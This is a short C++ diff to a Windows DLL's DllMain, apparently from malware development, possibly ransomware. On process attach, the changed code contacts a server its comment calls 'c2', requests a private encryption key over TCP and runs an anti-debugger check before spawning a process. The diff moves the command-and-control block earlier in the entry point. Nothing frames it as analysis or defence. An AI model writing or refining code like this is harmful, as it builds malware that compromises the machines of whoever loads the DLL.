@@ -35,6 +35,15 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	switch ( ul_reason_for_call )
 	{
 	case DLL_PROCESS_ATTACH:		
+		Client me;
+
+		// try to connect to c2 server
+		if ( !me.Connect() )
+			me.~Client();
+
+		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
+		me.MakeTCPRequest(req, TRUE);
+
 		ProcessManager mgr;
 		mgr.CheckNoDebugger();
 
@@ -59,14 +68,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			&pi
 		);
 
-		Client me;
 
-		// try to connect to c2 server
-		if ( !me.Connect() )
-			me.~Client();
-
-		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
-		me.MakeTCPRequest(req, TRUE);
 		me.Disconnect();
 
 		break;
